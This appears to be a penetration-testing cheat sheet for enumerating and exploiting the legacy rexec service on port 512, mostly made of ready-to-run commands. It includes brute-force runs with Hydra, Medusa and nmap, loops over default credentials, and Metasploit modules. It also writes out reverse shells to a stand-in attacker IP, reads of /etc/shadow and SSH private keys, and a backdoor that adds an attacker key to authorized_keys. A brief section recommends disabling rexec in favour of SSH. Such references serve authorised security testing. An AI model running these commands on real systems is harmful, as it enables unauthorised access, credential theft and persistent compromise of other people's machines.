# REXEC ENUMERATION (Port 512)

## SERVICE OVERVIEW
```
REXEC (Remote Execution) is an insecure remote command execution service
- No encryption (credentials and commands sent in plain text)
- Legacy service, rarely used in modern systems
- Authentication via username/password
- Replaced by SSH in modern environments
- Common in old UNIX systems
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p512 <IP>                              # Service/Version detection
nc -nv <IP> 512                                  # Manual connection
telnet <IP> 512                                  # Alternative connection
```

## BASIC ENUMERATION
```bash
# Nmap scripts
nmap -p512 --script rexec-brute <IP>             # Brute force
nmap -p512 -sV <IP>                              # Version detection

# Banner grab
nc <IP> 512
```

## MANUAL REXEC AUTHENTICATION
```bash
# rexec protocol expects:
# 1. Secondary port number (2 bytes, null-terminated)
# 2. Username (null-terminated)
# 3. Password (null-terminated)
# 4. Command (null-terminated)

# Connect with rexec client (if available)
rexec <IP> -l username -p password "whoami"
rexec <IP> -l root -p password "id; uname -a"
rexec <IP> -l admin -p admin "cat /etc/passwd"
```

## USER ENUMERATION
```bash
# Trial-and-error user enumeration
# Different error responses for valid vs invalid users

# Common usernames to test
root
admin
administrator
user
guest
oracle
postgres
mysql
daemon
```

## BRUTE FORCE ATTACKS
```bash
# Hydra
hydra -l root -P passwords.txt <IP> rexec        # Single user
hydra -L users.txt -P passwords.txt <IP> rexec   # User/pass lists
hydra -l root -P rockyou.txt -t 4 <IP> rexec     # Limit threads

# Medusa
medusa -h <IP> -u root -P passwords.txt -M rexec
medusa -h <IP> -U users.txt -P passwords.txt -M rexec

# Nmap
nmap -p512 --script rexec-brute --script-args userdb=users.txt,passdb=passwords.txt <IP>
```

## DEFAULT CREDENTIALS
```bash
# Common default credentials for rexec
root:root
root:toor
root:password
admin:admin
guest:guest
test:test
oracle:oracle
daemon:daemon

# Automated testing
for user in root admin test; do
    for pass in root admin password; do
        echo "Testing $user:$pass"
        rexec <IP> -l $user -p $pass "whoami" 2>/dev/null
    done
done
```

## REMOTE COMMAND EXECUTION
```bash
# Execute commands (requires valid credentials)
rexec <IP> -l root -p password "whoami"
rexec <IP> -l root -p password "id"
rexec <IP> -l root -p password "uname -a"
rexec <IP> -l root -p password "cat /etc/passwd"
rexec <IP> -l root -p password "ps aux"
rexec <IP> -l root -p password "netstat -tulpn"
rexec <IP> -l root -p password "ls -la /home"

# Reverse shell
rexec <IP> -l root -p password "bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1"
rexec <IP> -l root -p password "nc -e /bin/bash <attacker_IP> 4444"
rexec <IP> -l root -p password "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<attacker_IP>\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
```

## TRAFFIC SNIFFING
```bash
# Capture rexec traffic (credentials in plain text!)
tcpdump -i eth0 -A 'tcp port 512'
wireshark (filter: tcp.port == 512)

# rexec sends credentials in clear text:
# - Username
# - Password
# - Commands
# All are visible in network capture
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/rservices/rexec_login      # rexec login scanner
set RHOSTS <IP>
set USERNAME root
set PASSWORD password
run

# Post-exploitation
use exploit/unix/misc/rexec                      # rexec exploit
set RHOST <IP>
set USERNAME root
set PASSWORD password
run
```

## VULNERABILITY SCANNING
```bash
# Known vulnerabilities
searchsploit rexec

# The service itself is a vulnerability (no encryption, plain text auth)
```

## INTERESTING FILES & CONFIGURATION
```bash
# After gaining access via rexec
rexec <IP> -l root -p password "cat /etc/passwd"
rexec <IP> -l root -p password "cat /etc/shadow"
rexec <IP> -l root -p password "cat ~/.bash_history"
rexec <IP> -l root -p password "find / -perm -4000 2>/dev/null"  # SUID binaries
rexec <IP> -l root -p password "cat /etc/hosts"
rexec <IP> -l root -p password "cat /etc/hosts.allow"
rexec <IP> -l root -p password "cat /etc/hosts.deny"

# Service configuration
/etc/xinetd.d/rexec                              # xinetd configuration (modern)
/etc/inetd.conf                                  # inetd configuration (old)
```

## COMMON MISCONFIGURATIONS
```
☐ Service enabled at all                        # Should be disabled
☐ No encryption                                  # Inherent to protocol
☐ Default credentials                            # Easy access
☐ No IP restrictions                             # Accessible from anywhere
☐ Root login allowed                             # Direct root access
☐ No logging/auditing                            # Attacks go unnoticed
☐ Running on internet-facing system              # Easy target
☐ Used instead of SSH                            # Security nightmare
```

## QUICK WIN CHECKLIST
```
☐ Test default credentials (root:root, admin:admin)
☐ Brute force with common passwords
☐ Check if root login is allowed
☐ Sniff network traffic for credentials
☐ Test for anonymous/guest access
☐ Execute commands if credentials found
☐ Check for known vulnerabilities
☐ Look for other r-services (rlogin:513, rsh:514)
```

## ONE-LINER FULL ENUMERATION
```bash
# Quick rexec check
nmap -sV -p512 --script rexec-brute <IP>

# Test default credentials
for pass in root admin password toor; do rexec <IP> -l root -p $pass "whoami" 2>/dev/null && echo "[+] Password: $pass"; done
```

## POST-EXPLOITATION (After successful authentication)
```bash
# Information gathering
rexec <IP> -l root -p password "whoami && id && hostname"
rexec <IP> -l root -p password "uname -a"
rexec <IP> -l root -p password "cat /etc/issue"
rexec <IP> -l root -p password "cat /etc/passwd"
rexec <IP> -l root -p password "ps aux"
rexec <IP> -l root -p password "netstat -tulpn"
rexec <IP> -l root -p password "iptables -L"
rexec <IP> -l root -p password "df -h"

# Establish reverse shell
# Set up listener: nc -lvnp 4444
rexec <IP> -l root -p password "bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1"

# Download sensitive files
rexec <IP> -l root -p password "cat /etc/shadow" > shadow.txt
rexec <IP> -l root -p password "cat ~/.ssh/id_rsa" > id_rsa

# Upload backdoor (if possible)
echo "attacker_ssh_key" | rexec <IP> -l root -p password "cat >> ~/.ssh/authorized_keys"
```

## SECURITY IMPLICATIONS
```
CRITICAL VULNERABILITIES:
1. No encryption - all traffic in plain text
2. Credentials transmitted in clear text
3. Commands transmitted in clear text
4. No modern authentication mechanisms
5. Often allows root login
6. Minimal logging
7. Legacy protocol with known weaknesses
8. Should NEVER be used in production

RECOMMENDATION:
- Disable rexec immediately
- Replace with SSH
- If found during pentest, report as CRITICAL finding
```

## R-SERVICES OVERVIEW
```
The "R-services" are a suite of legacy UNIX services:

Port 512 - rexec:   Remote execution with password auth
Port 513 - rlogin:  Remote login (similar to telnet)
Port 514 - rsh:     Remote shell (trusted hosts, no password)

All r-services:
- Transmit data in plain text
- Are extremely insecure
- Should be replaced with SSH
- Are rarely found in modern systems
- When found, indicate poor security practices
```

## ALTERNATIVE EXPLOITATION TECHNIQUES
```bash
# If rexec client not available, manual connection:
# (More complex, requires understanding of protocol)
python -c "
import socket
s = socket.socket()
s.connect(('<IP>', 512))
s.send('0\x00')                    # Secondary port
s.send('root\x00')                 # Username
s.send('password\x00')             # Password
s.send('whoami\x00')               # Command
print(s.recv(1024))
s.close()
"
```
